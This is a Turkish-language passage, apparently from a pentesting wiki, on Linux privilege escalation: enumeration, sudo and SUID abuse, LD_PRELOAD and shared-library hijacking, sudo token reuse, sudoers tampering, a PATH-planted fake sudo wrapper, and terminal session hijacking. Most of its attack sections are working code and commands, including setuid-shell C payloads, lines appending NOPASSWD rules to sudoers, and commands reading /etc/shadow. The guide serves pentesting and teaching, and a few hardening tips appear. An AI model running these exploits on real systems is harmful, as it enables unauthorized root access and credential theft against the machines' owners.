D-Bus, eşleşen politika kurallarının kümülatif etkisine göre mesaj izinlerini (yöntem çağrıları, sinyal yayınları vb.) yöneten bir **allow/deny model** üzerinde çalışır. Bu politikalar bus ile etkileşimleri belirtir ve bu izinlerin kötüye kullanılması yoluyla ayrıcalık yükseltmeye olanak tanıyabilir.

Böyle bir politikaya `/etc/dbus-1/system.d/wpa_supplicant.conf` içinde bir örnek verilmiştir; bu örnek, root kullanıcısının `fi.w1.wpa_supplicant1`'i sahiplenme, ona gönderme ve ondan alma izinlerini detaylandırır.

Belirtilmiş bir kullanıcı veya grup olmayan politikalar evrensel olarak uygulanır; oysa "default" bağlam politikaları diğer belirli politikalar tarafından kapsanmayan herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini nasıl enumerate edip exploit edeceğinizi burada öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağda enumerate yapmak ve makinenin konumunu belirlemek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Erişmeden önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Trafiği sniff edip edemeyeceğinizi kontrol edin. Eğer yapabiliyorsanız, bazı credentials yakalayabilirsiniz.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Kim olduğunu, hangi **privileges**'e sahip olduğunu, sistemlerde hangi **users**'ın bulunduğunu, hangilerinin **login** yapabildiğini ve hangilerinin **root privileges**'e sahip olduğunu kontrol et:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalıkları yükseltmesine izin veren bir hatadan etkilendi. Daha fazla bilgi: [burada](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [burada](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [burada](https://twitter.com/paragonsec/status/1071152249529884674).\
**Bunu istismar edin** kullanarak: **`systemd-run -t /bin/bash`**

### Gruplar

root ayrıcalıkları sağlayabilecek bir **grubun üyesi olup olmadığınızı** kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Pano içinde ilginç bir şey olup olmadığını kontrol edin (mümkünse)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Ortamın **herhangi bir parolasını biliyorsanız**, bu parolayı kullanarak **her kullanıcı olarak giriş yapmayı deneyin**.

### Su Brute

Eğer çok fazla gürültü çıkarmayı umursamıyorsanız ve `su` ile `timeout` ikili dosyaları bilgisayarda mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıyı brute-force etmeyi deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresiyle de kullanıcıları brute-force etmeye çalışır.

## Yazılabilir PATH istismarları

### $PATH

Eğer $PATH içindeki bir klasöre **yazabiliyorsanız**, farklı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutun adıyla yazılabilir klasörün içinde **bir backdoor oluşturarak** ayrıcalıkları yükseltebilirsiniz; ancak bu komutun $PATH'te yazılabilir klasörünüzden önce yer alan bir klasörden **yüklenmemesi** gerekir.

### SUDO and SUID

Bazı komutları sudo ile çalıştırmaya izinli olabilirsiniz veya bazı dosyaların suid biti setli olabilir. Bunu şu komutla kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumaya ve/veya yazmaya veya hatta bir komutu çalıştırmaya izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla bir komutu parola bilmeden çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo` `vim`'i `root` olarak çalıştırabiliyor; artık root dizinine bir ssh key ekleyerek veya `sh` çağırarak kolayca bir shell elde etmek mümkün.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, kullanıcının bir **çevresel değişken (environment variable)** ayarlayarak bir şey çalıştırmasına izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer'a dayanan**, script root olarak çalıştırılırken rastgele bir python kütüphanesini yüklemek için **PYTHONPATH hijacking**'e **açıktı:**
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep aracılığıyla korunmuş → root shell

Eğer sudoers `BASH_ENV`'i koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komut çağrıldığında Bash’in etkileşimsiz başlangıç davranışından yararlanarak istediğiniz kodu root olarak çalıştırabilirsiniz.

- Why it works: Etkileşimsiz shell'ler için Bash, `$BASH_ENV`'i değerlendirir ve hedef script'i çalıştırmadan önce o dosyayı source eder. Birçok sudo kuralı bir script veya bir shell wrapper çalıştırılmasına izin verir. Eğer `BASH_ENV` sudo tarafından korunuyorsa, dosyanız root ayrıcalıklarıyla source edilir.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (etkileşimsiz olarak `/bin/bash` çağıran herhangi bir hedef, veya herhangi bir bash script).
- `BASH_ENV`'in `env_keep` içinde olması (`sudo -l` ile kontrol edin).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Sertleştirme:
- `BASH_ENV` (ve `ENV`) öğelerini `env_keep`'ten kaldırın, `env_reset`'i tercih edin.
- sudo-izinli komutlar için shell sarmalayıcılarından kaçının; minimal ikili (binary) kullanın.
- Korunan `env` değişkenleri kullanıldığında sudo I/O kaydı ve uyarı mekanizmalarını düşünün.

### Sudo yürütme atlatma yolları

**Jump** ile diğer dosyaları okuyun veya **symlinks** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılırsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komutu/SUID binary komut yolu olmadan

Eğer **sudo izni** tek bir komuta **komut yolu belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ PATH variable'ını değiştirerek exploit edebilirsiniz
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary başka bir komutu yolunu belirtmeden çalıştırıyorsa (her zaman garip bir SUID binary'nin içeriğini _**strings**_ ile kontrol edin) durumunda da kullanılabilir.

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu olan SUID binary

Eğer **suid** binary **başka bir komutu yolunu belirterek çalıştırıyorsa**, o zaman suid dosyasının çağırdığı komutun adıyla bir fonksiyon oluşturup bunu **export** etmeyi deneyebilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid ikili dosyasını çağırdığınızda, bu fonksiyon çalıştırılacaktır

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). Bu işleme kütüphane ön yüklemesi denir.

Ancak, sistem güvenliğini korumak ve bu özelliğin özellikle **suid/sgid** yürütülebilir dosyalarla kötüye kullanılmasını önlemek için sistem bazı koşullar uygular:

- Yükleyici, gerçek kullanıcı kimliği (_ruid_) ile etkin kullanıcı kimliği (_euid_) eşleşmeyen yürütülebilir dosyalar için **LD_PRELOAD**'ü göz ardı eder.
- suid/sgid olan yürütülebilir dosyalar için, yalnızca standart yollarda bulunan ve aynı zamanda suid/sgid olan kütüphaneler önceden yüklenir.

Privilege escalation, `sudo` ile komut çalıştırma yetkiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa gerçekleşebilir. Bu yapılandırma, komutlar `sudo` ile çalıştırıldığında bile **LD_PRELOAD** ortam değişkeninin korunmasına ve tanınmasına izin verir; bu da potansiyel olarak yükseltilmiş ayrıcalıklarla herhangi bir kodun çalıştırılmasına yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Kaydet: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra **bunu derleyin** kullanarak:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırırken
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, attacker **LD_LIBRARY_PATH** env variable'ını kontrol ediyorsa kötüye kullanılabilir çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Normal olmayan bir binary ile **SUID** izinleriyle karşılaşıldığında, **.so** dosyalarını doğru şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hatayla karşılaşmak exploitation için potansiyel olduğunu gösterir.

Bunu exploit etmek için, diyelim ki _"/path/to/.config/libcalc.c"_, adlı bir C dosyası oluşturup içine aşağıdaki kodu yazarsınız:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra, dosya izinlerini manipüle ederek ve yükseltilmiş ayrıcalıklarla bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını bir shared object (.so) dosyasına derlemek için:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'yi çalıştırmak exploit'i tetiklemeli ve potansiyel olarak sistemin ele geçirilmesine izin vermelidir.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
SUID binary'nin yazabileceğimiz bir klasörden kütüphane yüklediğini bulduğumuza göre, gerekli isimle o klasöre kütüphaneyi oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdakine benzer bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyon içermesi gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) saldırganların yerel güvenlik kısıtlamalarını aşmak için istismar edebileceği Unix ikili dosyalarının küratörlüğünü yapılmış bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise sadece bir komuta **argüman enjekte edebildiğiniz** durumlar için aynıdır.

Proje, restricted shell'lerden çıkmak, ayrıcalıkları yükseltmek veya korumak, dosya transferi yapmak, bind ve reverse shell'ler oluşturmak ve diğer post-exploitation görevlerine yardımcı olmak için kötüye kullanılabilecek Unix ikili dosyalarının meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l` çalıştırabiliyorsanız, herhangi bir sudo kuralını nasıl istismar edebileceğini kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Reusing Sudo Tokens

Parolayı bilmediğiniz ancak **sudo erişiminiz** olduğu durumlarda, bir sudo komutunun çalıştırılmasını **bekleyip oturum token'ını ele geçirerek** ayrıcalıkları yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

- Zaten "_sampleuser_" olarak bir shell'e sahipsiniz
- "_sampleuser_" son **15 dakika** içinde bir şey çalıştırmak için **`sudo`** kullanmış (varsayılan olarak sudo token'ının parola sormadan `sudo` kullanmamıza izin verdiği süre budur)
- `cat /proc/sys/kernel/yama/ptrace_scope` değeri 0
- `gdb` erişilebilir (yükleyebilirsiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

Eğer bu gereksinimlerin hepsi sağlanıyorsa, **ayrıcalıkları şu aracı kullanarak yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- İkinci **exploit** (`exploit_v2.sh`) _/tmp_ içinde bir sh shell oluşturacak, **setuid ile root'a ait**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Bu **üçüncü exploit** (`exploit_v3.sh`) **sudoers file oluşturacak** ve bu dosya **sudo tokens'i ebedi hale getirip tüm kullanıcıların sudo kullanmasına izin verecek**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Klasörde veya klasör içindeki oluşturulmuş dosyaların herhangi birinde **write permissions**'a sahipseniz, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) programını kullanarak bir kullanıcı ve PID için **sudo token oluşturabilirsiniz**.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve o kullanıcı olarak PID'si 1234 olan bir shell'e sahipseniz, parolayı bilmenize gerek kalmadan **sudo privileges** elde edebilirsiniz:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar kimin `sudo` kullanabileceğini ve nasıl kullanacağını yapılandırır. Bu dosyalar **varsayılan olarak sadece root kullanıcısı ve root grubu tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgiler **elde edebilirsiniz**, ve eğer herhangi bir dosyaya **yazabiliyorsanız** **escalate privileges** yapabilirsiniz.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazma izniniz varsa bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın başka bir yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` ikili dosyasına bazı alternatifler vardır; örneğin OpenBSD için `doas`. Yapılandırmasını `/etc/doas.conf` dosyasında kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlanıp ayrıcalıkları yükseltmek için `sudo` kullandığını** biliyorsanız ve o kullanıcı bağlamında bir shell elde ettiyseniz, root olarak kodunuzu çalıştırıp sonra kullanıcının komutunu yürütecek yeni bir sudo executable oluşturabilirsiniz. Ardından, kullanıcı bağlamının **$PATH**'ini (örneğin yeni yolu .bash_profile içine ekleyerek) değiştirin; böylece kullanıcı `sudo` çalıştırdığında sizin sudo executable'ınız çalıştırılır.

Dikkat: Kullanıcı farklı bir shell (bash olmayan) kullanıyorsa yeni yolu eklemek için başka dosyaları değiştirmeniz gerekir. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Veya şu gibi bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Aşağıdaki sayfada **bu yanlış yapılandırmanın nasıl istismar edilebileceğine** bakın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyalarsanız, `RPATH` değişkeninde belirtildiği gibi program tarafından bu konumda kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içine `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` ile kötü amaçlı bir kütüphane oluşturun.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux capabilities, bir sürece mevcut root ayrıcalıklarının bir **alt kümesini sağlar**. Bu, root **ayrıcalıklarını daha küçük ve ayrı birimlere böler**. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Bu şekilde tüm ayrıcalık seti azaltılarak kötüye kullanım riskleri düşürülür.\
Aşağıdaki sayfayı okuyarak **yetkiler ve bunların nasıl suistimal edileceği hakkında daha fazla bilgi edinin**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"execute" biti** etkilenen kullanıcının klasöre "**cd**" yapabilmesini ifade eder.\
**"read"** biti kullanıcının **dosyaları listeleyebilmesini**, ve **"write"** biti kullanıcının yeni **dosyalar** **oluşturup silebilmesini** ifade eder.

## ACLs

Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve geleneksel ugo/rwx izinlerini **geçersiz kılabilir**. Bu izinler, sahip olmayan veya grup üyesi olmayan belirli kullanıcılara hakları verip reddederek dosya veya dizin erişimi üzerinde daha fazla kontrol sağlar. Bu **ayrıntı düzeyi**, daha hassas erişim yönetimi sağlar. Daha fazla detay için [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) adresine bakın.

**Verin** kullanıcı "kali"ye bir dosya üzerinde okuma ve yazma izinleri:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Alın** sistemden belirli ACL'lere sahip dosyaları:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell oturumları

Eski **sürümlerde**, farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
En **yeni sürümlerde**, sadece **kendi kullanıcınızın** screen oturumlarına **connect** olabilirsiniz. Ancak, oturumun içinde **oturumun içinde ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**Screen oturumlarını listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Bir oturuma bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri** ile ilgili bir sorundu.  
root tarafından oluşturulmuş bir tmux (v2.1) session'ını ayrıcalıksız bir kullanıcı olarak hijack edemedim.

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Session'a bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** için bir örneğe bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) oluşturulan tüm SSL ve SSH anahtarları bu hata tarafından etkilenmiş olabilir.\
Bu hata, bu işletim sistemlerinde yeni bir ssh anahtarı oluşturulurken ortaya çıkar, çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH İlginç yapılandırma değerleri

- **PasswordAuthentication:** Parola ile kimlik doğrulamanın izin verilip verilmediğini belirtir. Varsayılan `no`'dur.
- **PubkeyAuthentication:** Public key ile kimlik doğrulamanın izin verilip verilmediğini belirtir. Varsayılan `yes`'tir.
- **PermitEmptyPasswords**: Parola ile kimlik doğrulama izinliyse, sunucunun boş parola dizelerine sahip hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`'dur.

### PermitRootLogin

root'un ssh kullanarak oturum açıp açamayacağını belirtir, varsayılan `no`'dur. Olası değerler:

- `yes`: root password ve private key kullanarak oturum açabilir
- `without-password` veya `prohibit-password`: root sadece private key ile oturum açabilir
- `forced-commands-only`: root sadece private key ile ve commands opsiyonları belirtilmişse oturum açabilir
- `no` : izin yok

### AuthorizedKeysFile

Kullanıcı kimlik doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. `%h` gibi tokenlar içerebilir; bu tokenlar home dizini ile değiştirilir. **Mutlak yollar** ( `/` ile başlayan) veya **kullanıcının home'undan göreli yollar** belirtebilirsiniz. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding allows you to **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server. So, you will be able to **jump** via ssh **to a host** and from there **jump to another** host **using** the **key** located in your **initial host**.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Dikkat: eğer `Host` `*` ise kullanıcı her farklı makineye geçtiğinde o host anahtarlara erişebilecek (bu bir güvenlik sorunudur).

Dosya `/etc/ssh_config` bu **seçenekleri** **ezebilir** ve bu yapılandırmaya izin verebilir ya da engelleyebilir.\
Dosya `/etc/sshd_config` `AllowAgentForwarding` anahtar kelimesiyle ssh-agent forwarding'e izin verebilir veya engelleyebilir (varsayılan izinlidir).

Eğer bir ortamda Forward Agent yapılandırıldığını görürseniz aşağıdaki sayfayı okuyun çünkü **bunu kötüye kullanarak ayrıcalıkları yükseltebilirsiniz**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profile dosyaları

Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar, **bir kullanıcı yeni bir shell çalıştırdığında çalıştırılan scriptlerdir**. Bu nedenle, bunlardan herhangi birini **yazabiliyor veya değiştirebiliyorsanız ayrıcalıkları yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **sensitive details**.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı isimlerde olabilir veya yedekleri bulunabilir. Bu yüzden **hepsini bulmanız** ve **okuyup okuyamadığınızı kontrol etmeniz**, dosyaların içinde **hashes** olup olmadığını görmek için önerilir:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğer) dosyasının içinde **password hashes** bulabilirsiniz.
```bash
